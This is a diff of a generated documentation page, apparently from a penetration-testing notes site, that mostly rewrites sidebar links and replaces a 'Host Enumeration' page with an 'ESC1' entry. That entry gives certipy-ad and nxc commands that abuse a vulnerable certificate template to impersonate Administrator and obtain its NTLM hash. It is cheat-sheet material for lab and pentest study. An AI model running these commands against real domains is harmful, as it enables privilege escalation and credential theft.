   
   
@@ -2766,7 +2771,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/" class="md-nav__link">
         
   
   
@@ -2789,7 +2794,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/" class="md-nav__link">
         
   
   
@@ -2812,7 +2817,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/" class="md-nav__link">
         
   
   
@@ -2835,7 +2840,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/" class="md-nav__link">
         
   
   
@@ -2907,7 +2912,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/" class="md-nav__link">
         
   
   
@@ -2930,7 +2935,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Bypassing%20MAC%20Filtering/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Bypassing%20MAC%20Filtering/" class="md-nav__link">
         
   
   
@@ -2953,7 +2958,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Cracking%20Passphrases/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Cracking%20Passphrases/" class="md-nav__link">
         
   
   
@@ -2976,7 +2981,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Decrypting%20Captures/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Decrypting%20Captures/" class="md-nav__link">
         
   
   
@@ -2999,7 +3004,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Driver%20Installation%20Alfa%20A1US036ACS/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Driver%20Installation%20Alfa%20A1US036ACS/" class="md-nav__link">
         
   
   
@@ -3022,7 +3027,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Finding%20Hidden%20Networks/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Finding%20Hidden%20Networks/" class="md-nav__link">
         
   
   
@@ -3045,7 +3050,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/" class="md-nav__link">
         
   
   
@@ -3068,7 +3073,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Monitor%20Mode/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Monitor%20Mode/" class="md-nav__link">
         
   
   
@@ -3091,7 +3096,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Reconnaissance/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Reconnaissance/" class="md-nav__link">
         
   
   
@@ -3183,7 +3188,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
+      <a href="../../../../" class="md-nav__link">
         
   
   
@@ -3203,8 +3208,6 @@
                 
   
   
-    
-  
   
   
     
@@ -3215,11 +3218,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
         
           
           <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
@@ -3235,7 +3238,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_7_2">
             <span class="md-nav__icon md-icon"></span>
             1. Reconnaissance & Enumeration
@@ -3249,7 +3252,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Domain%20User%20Enumeration/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3272,7 +3275,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Domain%20Wide%20Enumeration/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3295,7 +3298,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Enumerating%20Security%20Controls/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/" class="md-nav__link">
         
   
   
@@ -3318,7 +3321,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Group%20Membership/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/" class="md-nav__link">
         
   
   
@@ -3338,41 +3341,10 @@
                 
   
   
-    
-  
-  
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
-        
-  
-  
-  <span class="md-ellipsis">
-    Host Enumeration
-    
-  </span>
-  
-
-      </a>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
   
   
     <li class="md-nav__item">
-      <a href="../Living%20Off%20the%20Land%20Enumeration/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3395,7 +3367,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Password%20Policy%20Enumeration/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3418,12 +3390,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../SMB/" class="md-nav__link">
+      <a href="../../../../1.%20Reconnaissance%20%26%20Enumeration/Service%20Enumeration/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    SMB
+    Service Enumeration
     
   </span>
   
@@ -3490,7 +3462,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/ASREPRoast/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/ASREPRoast/" class="md-nav__link">
         
   
   
@@ -3513,7 +3485,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/IPv6%20Attacks/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/IPv6%20Attacks/" class="md-nav__link">
         
   
   
@@ -3536,7 +3508,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/LLMNR%20Poisoning/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/LLMNR%20Poisoning/" class="md-nav__link">
         
   
   
@@ -3559,7 +3531,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/NTLM%20Theft%20Files/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/NTLM%20Theft%20Files/" class="md-nav__link">
         
   
   
@@ -3582,7 +3554,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/NetNTLM%20Hash%20Stealing/" class="md-nav__link">
         
   
   
@@ -3605,7 +3577,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/Password%20Stuff/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/Password%20Stuff/" class="md-nav__link">
         
   
   
@@ -3628,7 +3600,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
         
   
   
@@ -3651,7 +3623,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/" class="md-nav__link">
         
   
   
@@ -3674,7 +3646,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/Relay%20Attacks/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/Relay%20Attacks/" class="md-nav__link">
         
   
   
@@ -3697,7 +3669,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/Word%20Doc%20Macro/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/Word%20Doc%20Macro/" class="md-nav__link">
         
   
   
@@ -3720,7 +3692,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/ZeroLogon/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/ZeroLogon/" class="md-nav__link">
         
   
   
@@ -3743,7 +3715,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
+      <a href="../../../../2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
         
   
   
@@ -3815,7 +3787,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/Credential%20Dumping/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/Credential%20Dumping/" class="md-nav__link">
         
   
   
@@ -3838,7 +3810,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/Credential%20Hunting/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/Credential%20Hunting/" class="md-nav__link">
         
   
   
@@ -3861,7 +3833,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/GPP%20Password/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/GPP%20Password/" class="md-nav__link">
         
   
   
@@ -3884,7 +3856,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/Hash%20Cracking/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/Hash%20Cracking/" class="md-nav__link">
         
   
   
@@ -3907,7 +3879,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/Kerberoasting/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/Kerberoasting/" class="md-nav__link">
         
   
   
@@ -3930,7 +3902,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3.%20Credential%20Theft/Unconstrained%20Delegation/" class="md-nav__link">
+      <a href="../../../../3.%20Credential%20Theft/Unconstrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -3958,6 +3930,8 @@
                 
   
   
+    
+  
   
   
     
@@ -3968,11 +3942,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5" checked>
         
           
           <label class="md-nav__link" for="__nav_7_5" id="__nav_7_5_label" tabindex="0">
@@ -3988,7 +3962,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7_5">
             <span class="md-nav__icon md-icon"></span>
             4. Privilege Escalation
@@ -3999,6 +3973,8 @@
                 
   
   
+    
+  
   
   
     
@@ -4009,11 +3985,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5_1" checked>
         
           
           <label class="md-nav__link" for="__nav_7_5_1" id="__nav_7_5_1_label" tabindex="0">
@@ -4029,7 +4005,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_5_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_5_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7_5_1">
             <span class="md-nav__icon md-icon"></span>
             Domain
@@ -4043,7 +4019,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/DCShadow/" class="md-nav__link">
+      <a href="../../DCShadow/" class="md-nav__link">
         
   
   
@@ -4066,7 +4042,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/DCSync/" class="md-nav__link">
+      <a href="../../DCSync/" class="md-nav__link">
         
   
   
@@ -4089,7 +4065,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/Diamond%20Ticket/" class="md-nav__link">
+      <a href="../../Diamond%20Ticket/" class="md-nav__link">
         
   
   
@@ -4112,7 +4088,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/Golden%20Ticket/" class="md-nav__link">
+      <a href="../../Golden%20Ticket/" class="md-nav__link">
         
   
   
@@ -4135,7 +4111,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/" class="md-nav__link">
+      <a href="../../NoPac%20%28SamAccountName%20Spoofing%29/" class="md-nav__link">
         
   
   
@@ -4158,7 +4134,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/Silver%20Ticket/" class="md-nav__link">
+      <a href="../../Silver%20Ticket/" class="md-nav__link">
         
   
   
@@ -4178,20 +4154,141 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/%C2%A9%EF%B8%8F%20ADCS/" class="md-nav__link">
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5_1_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_5_1_7" id="__nav_7_5_1_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ADCS
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_5_1_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_5_1_7">
+            <span class="md-nav__icon md-icon"></span>
+            ADCS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    ESC1
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
   <span class="md-ellipsis">
-    ©️ ADCS
+    ESC1
     
   </span>
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      ESC1
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Enumerate%20ADCS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumerate ADCS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -4245,7 +4342,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/" class="md-nav__link">
+      <a href="../../SCCM/SCCM%20Site%20Takeover%20I/" class="md-nav__link">
         
   
   
@@ -4268,7 +4365,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20II/" class="md-nav__link">
+      <a href="../../SCCM/SCCM%20Site%20Takeover%20II/" class="md-nav__link">
         
   
   
@@ -4348,7 +4445,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/Local%20Administrator%20Password%20Solution/" class="md-nav__link">
+      <a href="../../../Local/Local%20Administrator%20Password%20Solution/" class="md-nav__link">
         
   
   
@@ -4371,7 +4468,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/Token%20Privileges/" class="md-nav__link">
+      <a href="../../../Local/Token%20Privileges/" class="md-nav__link">
         
   
   
@@ -4394,7 +4491,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/UAC%20Bypasses/" class="md-nav__link">
+      <a href="../../../Local/UAC%20Bypasses/" class="md-nav__link">
         
   
   
@@ -4417,7 +4514,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/Unquoted%20Service%20Path/" class="md-nav__link">
+      <a href="../../../Local/Unquoted%20Service%20Path/" class="md-nav__link">
         
   
   
@@ -4440,7 +4537,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/Weak%20Service%20Binary%20Permissions/" class="md-nav__link">
+      <a href="../../../Local/Weak%20Service%20Binary%20Permissions/" class="md-nav__link">
         
   
   
@@ -4463,7 +4560,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4.%20Privilege%20Escalation/Local/Weak%20Service%20Permissions/" class="md-nav__link">
+      <a href="../../../Local/Weak%20Service%20Permissions/" class="md-nav__link">
         
   
   
@@ -4543,7 +4640,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
         
   
   
@@ -4566,7 +4663,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -4589,7 +4686,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
         
   
   
@@ -4612,7 +4709,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Execution%20Methods/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Execution%20Methods/" class="md-nav__link">
         
   
   
@@ -4635,7 +4732,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/" class="md-nav__link">
         
   
   
@@ -4658,7 +4755,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
         
   
   
@@ -4681,7 +4778,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
         
   
   
@@ -4704,7 +4801,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
         
   
   
@@ -4727,7 +4824,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Overpass%20The%20Hash/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Overpass%20The%20Hash/" class="md-nav__link">
         
   
   
@@ -4750,7 +4847,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Pass%20The%20Hash/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Pass%20The%20Hash/" class="md-nav__link">
         
   
   
@@ -4773,7 +4870,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Pass%20The%20Ticket/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Pass%20The%20Ticket/" class="md-nav__link">
         
   
   
@@ -4796,7 +4893,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Pivoting/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Pivoting/" class="md-nav__link">
         
   
   
@@ -4819,7 +4916,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -4842,7 +4939,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5.%20Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
+      <a href="../../../../5.%20Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
         
   
   
@@ -4914,7 +5011,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../6.%20Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
+      <a href="../../../../6.%20Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
         
   
   
@@ -4986,7 +5083,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Miscellaneous/Disable%20Restricted%20Admin%20Mode/" class="md-nav__link">
+      <a href="../../../../Miscellaneous/Disable%20Restricted%20Admin%20Mode/" class="md-nav__link">
         
   
   
@@ -5009,7 +5106,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Miscellaneous/Enable%20plaintext%20wdigest/" class="md-nav__link">
+      <a href="../../../../Miscellaneous/Enable%20plaintext%20wdigest/" class="md-nav__link">
         
   
   
@@ -5032,7 +5129,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Miscellaneous/Host%20Persistence/" class="md-nav__link">
+      <a href="../../../../Miscellaneous/Host%20Persistence/" class="md-nav__link">
         
   
   
@@ -5081,6 +5178,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      ESC1
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -5098,9 +5212,20 @@
   
 
 
-  <h1>Host Enumeration</h1>
+  <h1>ESC1</h1>
 
-
+<hr />
+<h3 id="esc1">ESC1</h3>
+<p>If a template is vulnerable to ESC1, certipy can automatically exploit it.
+Request the Administrators certificate:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;Template<span class="w"> </span>Name&gt;<span class="w"> </span>-upn<span class="w"> </span>Administrator@certified.htb<span class="w"> </span>-ca<span class="w"> </span>&lt;Certificate<span class="w"> </span>Authorities&gt;<span class="w"> </span>-target<span class="w"> </span>dc.domain.local
+</span></code></pre></div>
+Request TGS &amp; NTLM hash with certificate:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;IP&gt;
+</span></code></pre></div>
+Or with NXC:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--pfx-cert<span class="w"> </span>administrator.pfx<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span>
+</span></code></pre></div></p>
 
 
 
@@ -5152,10 +5277,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../../../../..", "features": ["content.code.copy", "navigation.tabs"], "search": "../../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      <script src="../../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
       
     
   </body>
